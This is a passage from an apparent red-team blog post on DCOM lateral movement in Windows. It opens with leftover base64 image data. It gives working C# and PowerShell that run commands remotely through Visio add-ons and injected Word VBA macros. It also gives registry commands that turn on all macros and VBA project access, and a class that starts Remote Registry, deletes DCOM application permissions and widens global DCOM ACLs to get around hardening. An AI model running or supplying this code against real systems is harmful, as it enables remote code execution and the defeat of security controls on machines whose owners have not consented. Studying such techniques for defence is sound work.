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"/>

The image was clear mistaken, but the post is so accurate than reconstructing the chain was trivial:

```powershell
$visio = [activator]::CreateInstance([type]::GetTypeFromProgID("Visio.InvisibleApp", $target))
$visio.Addons.Add("C:\Windows\System32\cmd.exe").Run("/c calc")
```

Translated in C#, it would appear like the following:

```cs
public static void VisioAddonEx(string target, string binary, string arg)
{
    try
    {
        var type = Type.GetTypeFromProgID("Visio.InvisibleApp", target);
        if (type == null)
        {
            Console.WriteLine(" [x] Visio not installed");
            return;
        }

        var obj = Activator.CreateInstance(type);
        var addons = obj.GetType().InvokeMember("Addons", BindingFlags.GetProperty, null, obj, null);
        var addon = addons.GetType()
            .InvokeMember(@"Add", BindingFlags.InvokeMethod, null, addons, new object[] { binary });
        // Executing Addon
        addon.GetType().InvokeMember("Run", BindingFlags.InvokeMethod, null, addon, new object[] { arg });
    }
    catch (Exception e)
    {
        Console.WriteLine(" [x] {0}", e.Message);
    }
}
```

### 

Last but not least, it is possible to execute arbitrary object directly executing VBA project into almost any office COM automation object (Excel, Word, PowerPoint, Access).

Word was chosen for the PoC code, as surely is the most widely used, and because Excel had already been covered by other, more reliable, methods.

That doesn't mean the following method is not reliable, but presents a major drawback. Indeed, in order to use this method, two settings in Word must be enabled in the context of the targeted user:

* Enable all macros (not recommended; potentially dangerous code can run)
* Trust access to the VBA project object model

The two options can be enabled via GUI, under Options->Trust Center->Macro Settings, or via Windows Registry, using the following commands:

```
reg add "HKCU\Software\Microsoft\Office\16.0\Word\Security" /v VBAWarnings /t REG_DWORD /d 1
reg add "HKCU\Software\Microsoft\Office\16.0\Word\Security" /v AccessVBOM /t REG_DWORD /d 1
```

**Note:** 16.0 is for version >=2016.


```cs
public static void OfficeMacro(string target, string binary, string arg)
{
    Console.WriteLine($"[*] Setting up Word Office Macro");
    try
    {
        var type = Type.GetTypeFromProgID("Word.Application", target);
        var code = $"{binary} {arg}";
        var macro = $@"Sub Execute()
Dim wsh As Object
Set wsh = CreateObject(""WScript.Shell"")
wsh.Run ""{code}""
Set wsh = Nothing
End Sub
Sub AutoOpen()
Execute
End Sub
";
        var obj = Activator.CreateInstance(type);

        var docs = obj.GetType().InvokeMember("Documents", BindingFlags.GetProperty, null, obj, null);
        foreach (var m in docs.GetType().GetProperties())
            if (m.Name == "Documents")
            {
                Console.WriteLine($" [+] Fetched: {m}");
                docs = m.GetValue(docs);
            }

        var doc = docs.GetType().InvokeMember("Add", BindingFlags.InvokeMethod, null, docs, new object[] { "" });
        // For some reason vbProject won't be initialized correctly with the following statement
        var vbProject = doc.GetType().InvokeMember("VBProject", BindingFlags.GetProperty, null, doc, null);
        Console.WriteLine(" [+] Setting up VBProject");

        foreach (var m in doc.GetType().GetProperties())
            if (m.Name == "VBProject")
            {
                Console.WriteLine($" [+] Fetched: {m}");
                vbProject = m.GetValue(doc);
            }

        var vbComponents = vbProject.GetType()
            .InvokeMember("VBComponents", BindingFlags.GetProperty, null, vbProject, null);
        var vbc = vbComponents.GetType()
            .InvokeMember("Add", BindingFlags.InvokeMethod, null, vbComponents, new object[] { 1 });

        Console.WriteLine(" [+] Loading Macro");

        var codeModule = vbc.GetType().InvokeMember("CodeModule", BindingFlags.GetProperty, null, vbc, null);
        codeModule.GetType().InvokeMember("AddFromString", BindingFlags.InvokeMethod, null, codeModule,
            new object[] { macro });
        // Run Macro
        doc.GetType().InvokeMember("RunAutoMacro", BindingFlags.InvokeMethod, null, doc, new object[] { 2 });
        // Shutdown Word
        obj.GetType().InvokeMember("Quit", BindingFlags.InvokeMethod, null, obj, null);
    }
    catch (Exception e)
    {
        Console.WriteLine(" [x] {0}", e.Message);
    }
}
```

### Protection

A usual suggestion by security experts to disable access to office COM objects. This can be easily done using the Microsoft **dcomcnfg.exe** utility. The advice is more than correct, but, depending on different situations/configurations, it may be not enough.

#### Bypass Application-Based permissions

Application based permissions are always stored under HKCR\AppID\{ApplicationAppID}, with values:

* AccessPermission
* LaunchPermission

Normally, when no permissions are set against an application, this value simply don't exist in the registry, allowing anyone to access them. That means that deleting those registry values, all the permissions will be reset!

Even if very effective, the above approach has two major drawbacks:

* Requires Admin access
* If against a remote target, Remote Registry Service must be enable on the remote machine.

#### Bypass Global permissions

Global based permissions are set in `HKLM\SOFTWARE\Microsoft\Ole`:

```
reg query "HKLM\SOFTWARE\Microsoft\Ole"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Ole
    DefaultLaunchPermission     REG_BINARY    {snipped}
    EnableDCOM                  REG_SZ        Y
    LegacyImpersonationLevel    REG_DWORD     0x2
    MachineAccessRestriction    REG_BINARY    {snipped}
    MachineLaunchRestriction    REG_BINARY    {snipped}
```

As the mechanism used to store access permission is the same used for Application Level Permissions, it might be legit to think that the same trick is usable. However, global DCOM permissions are always set by default, and changing them arbitrarily might be unsafe. To avoid this issue, it was tried to tamper the binary security descriptor associated with 

However, all the attempts tried showed that is not easy to change these kind of permissions remotely, even having administrator access.

The following C# code has been designed to access the registry, locate the COM Object AppIDs in a "noisy" way, (using sequential search instead of direct access), delete the permissions associated with the COM objects, and global permissions. The code had been tested locally and remotely, but showed to be fully working only if executed locally, by an Administrator in High Integrity mode.

```cs
static class ComACLRights
{
    public const int COM_RIGHTS_EXECUTE = 1;
    public const int COM_RIGHTS_EXECUTE_LOCAL = 2;
    public const int COM_RIGHTS_EXECUTE_REMOTE = 4;
    public const int COM_RIGHTS_ACTIVATE_LOCAL = 8;
    public const int COM_RIGHTS_ACTIVATE_REMOTE = 16;
}
class DCOMcfg
{
    private const string ClassIDKeyPath = "CLSID";//"AppID";
    private const string AppIDKeyPath = "AppID";
    private const string OleKeyPath = "SOFTWARE\\Microsoft\\Ole";

    private string target;
    private bool isRemote;
    private bool debug;
    private string[] applications;

    private RegistryKey classesRootKey;
    private RegistryKey localMachineKey;

    public DCOMcfg(string target=null)
    {
        this.debug = false;
        this.isRemote = false;
        this.target = Environment.MachineName;
        if (target != Environment.MachineName && !String.IsNullOrEmpty(target))
        {
            this.target = String.Format("{0}{1}", "\\\\", target);
            this.isRemote = true;
        }
        this.applications = new[]
            {"MMC20.Application","Excel.Application","Visio.Application" , "Visio.InvisibleApp", "Outlook.Application", "Word.Application"};

        if (this.isRemote)
        {
            this.classesRootKey = RegistryKey.OpenRemoteBaseKey(RegistryHive.ClassesRoot, this.target, RegistryView.Default);
            this.localMachineKey = RegistryKey.OpenRemoteBaseKey(RegistryHive.LocalMachine, this.target, RegistryView.Default);
        }
        else
        {
            /*
            if (Environment.Is64BitOperatingSystem)
                this.classesRootKey = RegistryKey.OpenBaseKey(RegistryHive.ClassesRoot, RegistryView.Registry32);
            else
                this.classesRootKey = RegistryKey.OpenBaseKey(RegistryHive.ClassesRoot, RegistryView.Registry32);
            */
            this.classesRootKey = RegistryKey.OpenBaseKey(RegistryHive.ClassesRoot, RegistryView.Default);
            this.localMachineKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Default);
        }

    }

    public string getTarget()
    {
        return this.target;
    }

    public bool EnsureRemoteRegistryRunning()
    {
        bool result = false;
        try
        {
            System.ServiceProcess.ServiceController sc = new ServiceController("RemoteRegistry", this.target);
            if (sc.Status.Equals(ServiceControllerStatus.Stopped)){
                if (sc.StartType == ServiceStartMode.Disabled)
                {
                     ServiceHelper.ChangeStartMode(sc, ServiceStartMode.Automatic);
                }
                sc.Start();
                Thread.Sleep(2000);
                result = sc.Status.Equals(ServiceControllerStatus.Running);
            }
            else
            {  
                result = true;
            }
        } catch
        {
            // it is stopped
            result = false;
        }

        return result;
    }

    static string DictToTable(Dictionary<string, bool> dictionary)
    {
        string dictionaryString = "";
        foreach (KeyValuePair<string, bool> keyValues in dictionary)
        {
            dictionaryString += (keyValues.Value ? " [+] SUCCESS:" : " [-] FAILED:");
            dictionaryString += $" {keyValues.Key}{Environment.NewLine}";
        }
        return dictionaryString;
    }

    private List<string> AppNamesToClsIds()
    {
        Guid testGuid = Guid.NewGuid();
        List<string> appIDs = new List<string>();
     
        foreach (string app in this.applications)
        {
            string appID = "";
            try
            {
                using (var key = this.classesRootKey.OpenSubKey(Path.Combine(app, "CLSID")))
                {
                    // Get Default Value
                    string appClsId = key?.GetValue("") as string;
                   
                    if (Guid.TryParse(appClsId, out testGuid))
                    {
                        using (var subKey = this.classesRootKey.OpenSubKey(Path.Combine(ClassIDKeyPath, appClsId)))
                        {
                            appID = subKey?.GetValue("AppID") as string;
                            if (!Guid.TryParse(appID, out testGuid))
                            {
                                throw new Exception($"Invalid AppID: {app}");
                            }
                            appIDs.Add(appID);
                        }
                    }
                    else
                    {
                        throw new Exception($"Invalid CLSID: {app}");
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($" [x] WARNING: Catch exception {e.Message}");
                continue;
            }
        }

        return appIDs;
    }

    private Dictionary<string, bool> DeleteAppPermissions(List<string> appIDs)
    {
        List<string> permissionKeys = new List<string>(){ @"AuthenticationLevel", @"LaunchPermission", @"AccessPermission" };
        Dictionary<string, bool> results = new Dictionary<string, bool>();
        

        foreach (string appID in appIDs)
        {
            try
            {
                bool res = true;
                using (RegistryKey key =
                    this.classesRootKey.OpenSubKey(Path.Combine(AppIDKeyPath, appID), true))
                {
                    foreach (string subKeyName in permissionKeys)
                    {
                        try
                        {
                            /*RegistrySecurity rs = new RegistrySecurity();
                            rs.AddAccessRule(new RegistryAccessRule("Everyone",
                                RegistryRights.WriteKey,
                                InheritanceFlags.None,
                                PropagationFlags.None,
                                AccessControlType.Allow));
                            key.SetAccessControl(rs);
                            */
                            key.DeleteValue(subKeyName.ToUpperInvariant());
                            res = res || true;
                        }
                        catch (Exception e)
                        {
                            if (this.debug)
                            {
                                Console.WriteLine($"[-] Failed: {e.Message}");
                            }

                            res = res || false;
                            continue;
                        }
                    }
                }

                results[appID] = res;
            }
            catch (SecurityException se)
            {
                Console.WriteLine($"[-] {se.Message}");
            }
            catch (Exception e)
            {
                if (this.debug)
                {
                    Console.WriteLine($"[-] Failed: {e.Message}");
                }

                results[appID] = false;
            }

        }
        return results;
    }

    public void EnsureDCOMPermission()
    {
        if(this.isRemote){
            Console.WriteLine("[*] Ensuring Remote Registry Access");
            EnsureRemoteRegistryRunning();
        }
        Console.WriteLine("[*] Converting application names to CLS IDs");
        // Add named applications CLSIDs
        List<string> clsIDs = this.AppNamesToClsIds();
        // Add ShellBrowser and Shell
        clsIDs.Add("{C08AFD90-F2A1-11D1-8455-00A0C91F3880}");
        clsIDs.Add("{9BA05972-F6A8-11CF-A442-00A0C90A8F39}");

        Console.WriteLine("[+] Enabling Global Ole permissions");
        try
        {
            this.EnsureGlobalPermissions();
        }
        catch(Exception e)
        {
            Console.WriteLine($" [x] Could not access Global Ole permissions: {e.Message}");
        }

        Console.WriteLine("[+] Deleting troublesome app permissions");
        // Deleting permissions
        Dictionary<string, bool> results = DeleteAppPermissions(clsIDs);

        Console.WriteLine("[+] Done, results:");
        Console.Write(DictToTable(results));
    }

    private void EnsureGlobalPermissions()
    {
        RegistryKey oleKey = this.localMachineKey.OpenSubKey(OleKeyPath, true);
        var value = oleKey.GetValue("DefaultAccessPermission");

        RawSecurityDescriptor sd;
        RawAcl acl;

        if (value == null)
        {
            System.Console.WriteLine("[+] Default Access Permission not found. No need to fix.");
            return;
        }
        else
        {
            sd = new RawSecurityDescriptor(value as byte[], 0);
        }
        acl = sd.DiscretionaryAcl;
        bool found = false;
        foreach (CommonAce ca in acl)
        {
            if (ca.SecurityIdentifier.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid))
            {
                if(this.isRemote){
                    //ensure local and network access is set
                    ca.AccessMask |= ComACLRights.COM_RIGHTS_EXECUTE | ComACLRights.COM_RIGHTS_EXECUTE_LOCAL | ComACLRights.COM_RIGHTS_ACTIVATE_LOCAL
                    | ComACLRights.COM_RIGHTS_ACTIVATE_REMOTE | ComACLRights.COM_RIGHTS_EXECUTE_REMOTE; // We would like local and remote access
                }
                else
                {
                    ca.AccessMask |= ComACLRights.COM_RIGHTS_EXECUTE | ComACLRights.COM_RIGHTS_EXECUTE_LOCAL | ComACLRights.COM_RIGHTS_ACTIVATE_LOCAL; // We would like local access
                }

                found = true;
                break;
            }
        }
        if (!found)
        {
            // Administrator was not found.  Add it to the ACL
            SecurityIdentifier si = new SecurityIdentifier(
                WellKnownSidType.BuiltinAdministratorsSid, null);
            CommonAce ca = new CommonAce(
                AceFlags.None,
                AceQualifier.AccessAllowed,
                ComACLRights.COM_RIGHTS_EXECUTE | ComACLRights.COM_RIGHTS_EXECUTE_LOCAL | ComACLRights.COM_RIGHTS_ACTIVATE_LOCAL,
                si,
                false,
                null);
            acl.InsertAce(acl.Count, ca);
        }
        //re-set the ACL
        sd.DiscretionaryAcl = acl;

        byte[] binaryform = new byte[sd.BinaryLength];
        sd.GetBinaryForm(binaryform, 0);
        oleKey.SetValue("DefaultAccessPermission", binaryform, RegistryValueKind.Binary);
    }
}
```

## Full Code

The full code is available at [CheeseDCOM][1].

## References

[1]:https://github.com/klezVirus/MiscTools
[2]:https://www.cybereason.com/blog/dcom-lateral-movement-techniques

[Back to Red Teaming](../../)

[Back to Home](https://klezvirus.github.io/)
